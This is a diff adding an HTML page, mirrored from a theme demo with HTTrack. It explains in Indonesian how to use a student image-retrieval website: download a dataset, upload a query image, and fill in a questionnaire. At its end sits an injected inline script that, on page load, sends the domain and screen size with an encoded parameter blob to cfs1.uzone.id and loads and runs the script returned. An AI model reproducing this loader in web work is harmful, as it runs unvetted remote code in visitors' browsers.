@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Mirrored from demos.jeweltheme.com/inventory/how-it-works.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Apr 2017 02:29:34 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no" />
+    
+    <meta name="author" content="">
+    <meta name="description" content="Task">
+    <meta name="keywords" content="">
+    <title>CBIR - Content Based Images Retrieval</title>
+    <link rel="shortcut icon" href="gambar/favicon.ico" type="image/x-icon">
+    <!-- bootstrap -->
+    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/jquery.datetimepicker.min.css">
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap-select.min.css">
+    <!-- popup -->
+    <link rel="stylesheet" type="text/css" href="assets/css/magnific-popup.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/nouislider.min.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/index.css">
+    <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <!-- MAIN -->
+ <div class="inv-header  inv-header2 ">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 padd-lr0">
+                <div class="inv-top-menus">
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 padd-lr0">
+                <div class="wpc-navigation clearfix">
+                    <div class="inv-logo">
+                        <a href="index.html">
+                            <img src="gambar/Logo2-Fix.png" alt="theme logo">
+                        </a>
+                    </div>
+                    <nav>
+                        <ul class="main-menu">
+                            <li class="menu-item menu-item ">
+                                <a href="index.html">Home</a>
+                            </li>
+                            <li class="menu-item active-menu-item">
+                                <a href="how-it-works.html">How It Works</a>
+                            </li>
+                        </ul>
+                        <div class="nav-menu-icon"><i></i></div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- preload -->
+<div id="loading">
+<div id="loading-center">
+<div id="loading-center-absolute">
+<div class="object" id="first_object"></div>
+<div class="object" id="second_object"></div>
+<div class="object" id="third_object"></div>
+
+</div>
+</div>
+
+</div>
+
+<!-- //////////////////////// -->
+<div class="inv-start-block inv-bg-block margin-lg-t140 margin-sm-t95">
+    <img src="gambar/bg1.jpg" alt="" class="inv-img">
+    <div class="container padd-lr0">
+        <div class="row">
+            <div class="col-xs-12">
+                <header class=" inv-block-header margin-lg-t180 margin-lg-b180 margin-sm-t150 margin-sm-b150">
+                    <h1>CARA MENJALANKAN WEBSITE</h1>
+                </header>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- //////////////////////// -->
+<div class="container">
+    <div class="row">
+        <div class="col-md-6 padd-lr0">
+            <div class="inv-it-work-info padding-lg-t265 padding-sm-t50 margin-lg-b55">
+                <h3>Download Dataset Gambar</h3>
+                <p>Download kumpulan dataset gambar berikut ini. Gambar-gambar tersebut digunakan sebagai gambar query ataupun gambar input.</p> <p> <a style="color:blue;" href="Download.php?file=Dataset.zip">Download File...</a></p>
+            </div>
+        </div>
+        <div class="col-md-6">
+            <div class="inv-it-work-img padding-lg-t150 padding-sm-t0 margin-lg-b55">
+                <img src="gambar/l6.png" alt="">
+            </div>
+        </div>
+        <div class="col-xs-12">
+            <div class="inv-it-pseudoelem"><div class="inv-it-pseudo1"></div>
+            <div class="inv-it-pseudo2"></div></div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-md-6 col-md-push-6 ">
+            <div class="inv-it-work-info padding-lg-t175 padding-sm-t0 margin-lg-b55">
+                <h3>Input Gambar</h3>
+                <p>Input gambar yang akan dicari. Masukkan gambar sesuai dengan yang diiginkan. File input harus berupa gambar dengan format png, jpeg ataupun jpg. Setelah dimasukkan file gambar, tekan tombol Search Now.</p>
+            </div>
+        </div>
+        <div class="col-md-6  col-md-pull-6 ">
+            <div class="inv-it-work-img padding-lg-t60 padding-sm-t50 padding-lg-b60">
+                <img src="gambar/l7.png" alt="">
+            </div>
+        </div>
+        <div class="col-xs-12">
+            <div class="inv-it-pseudoelem2"><div class="inv-it-pseudo1"></div>
+            <div class="inv-it-pseudo2"></div></div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-md-6">
+            <div class="inv-it-work-info padding-lg-t175 padding-sm-t50">
+                <h3>Tampilan Hasil</h3>
+                <p>Gambar yang ditampilkan berupa 20 gambar yang memiliki kemiripan warna dengan gambar query. Setelah anda menjalankan website ini, diharapkan mengisi kuisioner yang telah disediakan. Klik link berikut ini.</p> <p> <a style="color:blue;" href="https://goo.gl/forms/9VtdCHCieUpobxnM2">Klik Untuk Mengisi Kuisioner</a></p>
+            </div>
+        </div>
+        <div class="col-md-6">
+            <div class="inv-it-work-img padding-lg-t60">
+                <img src="gambar/l8.png" alt="">
+            </div>
+        </div>
+
+    </div>
+</div>
+<!-- //////////////////////// -->
+<!-- FOOTER -->
+<a href="#" class="toTop"><i class="fa fa-chevron-up" aria-hidden="true"></i></a>
+<footer class="inv-bg-block padding-lg-t115 padding-lg-b105 padding-xs-t0 padding-xs-b50">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<div class="inv-copy bg-12">
+    <div class="container padd-lr0">
+        <div class="row">
+            <div class="col-xs-12">
+                <span>&#169; CBIR-Content Based Images Retrieval 2017  | Developed By Maulana&Yustina Designed By Maulana </span>
+                <nav class="soc-net">
+                    <ul>
+                        <li>
+                            <a href="#"><img src="gambar/p1.png" alt=""></a>
+                        </li>
+                        <li>
+                            <a href="#"><img src="gambar/p2.png" alt=""></a>
+                        </li>
+                        <li>
+                            <a href="#"><img src="gambar/p3.png" alt=""></a>
+                        </li>
+                        <li>
+                            <a href="#"><img src="gambar/p4.png" alt=""></a>
+                        </li>
+                        <li>
+                            <a href="#"><img src="gambar/p5.png" alt=""></a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+</div>
+ 
+    <!-- Scripts project -->
+    <script type="text/javascript" src="assets/js/jquery-2.2.4.min.js"></script>
+    <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
+    <!-- count -->
+    <script type="text/javascript" src='assets/js/jquery.countTo.js'></script>
+    <!-- google maps -->
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAbFz5lDPCTfnGzNrFB-fIfmZ69O41g-G8&amp;signed_in=true&amp;libraries=places,visualization"></script>
+    <!-- swiper -->
+    <script type="text/javascript" src="assets/js/idangerous.swiper.min.js"></script>
+    <!-- jQuery Responsive Thumbnail Gallery Plugin -->
+    <script type="text/javascript" src="assets/js/responsivethumbnailgallery.js"></script>
+    <script type="text/javascript" src="assets/js/jquery.datetimepicker.full.min.js"></script>
+    <!-- Latest compiled and minified JavaScript -->
+    <script type="text/javascript" src="assets/js/bootstrap-select.min.js"></script>
+    <!-- popup -->
+    <script type="text/javascript" src="assets/js/jquery.magnific-popup.min.js"></script>
+    <!-- rating -->
+    <script type="text/javascript" src="assets/js/jquery.raty-fa.js"></script>
+    <!-- izotop -->
+    <script type="text/javascript" src="assets/js/isotope.pkgd.min.js"></script>
+    <!-- slider -->
+    <script type="text/javascript" src="assets/js/nouislider.min.js"></script>
+    <script type="text/javascript" src="assets/js/jquery.matchHeight.js"></script>
+    <script type="text/javascript" src="assets/js/index.js"></script>
+    <!-- sixth block end -->
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKhre23Aeb68njJq2YLL5uTvq3d1Ku2pe01kDrrFAE%2bK1k7cUfO5AJ4cKDonqwNuiRIRGa5A3og5Ivgx2%2bbH6h9KrPALwzgo7BQFz4ai0oosftcTM2xDXdgHUOQx6lnlX0ePARUxaV0OdV%2fR7f0f8JKCKTzFjt8GyVzJWwmTYOkHBRxaYcJHCo33Z6EFrDcVY7x157VCEXz7V99ddE%2fRTTlZGQoPVdoZAGFe6RV6bnsiH1%2fSxM3%2fgvOcgkB4%2f7gJ9Crx663%2fk6MvGkcXmWuvgiY6qNQpq93yqdhfEfieTR2yzQ4AV%2fjU7hAOI4P15aNn%2buKlJRcN711E7QJQIITfp8ey0%2f0WQ5LhQpHJmDHuTO3WYaKtmmNXQSG34%2b7Kza7REUirtMp8%2bQwFYS2sWhq%2fpeZG6TdS7WAOKuDb1cdNZcenv%2bpWAWJUMmo7rvq4pVqoBTYo0KXN6LoUIth7jo%2bzG8umgmlmC7Xmn0gRoP4XKA%2f6QzFICMUFeAEJSZHrFQ56m5NIZovweAs7zw521L7a7O4GU0yDc6n11N" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+<!-- Mirrored from demos.jeweltheme.com/inventory/how-it-works.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Apr 2017 02:29:39 GMT -->
+</html>
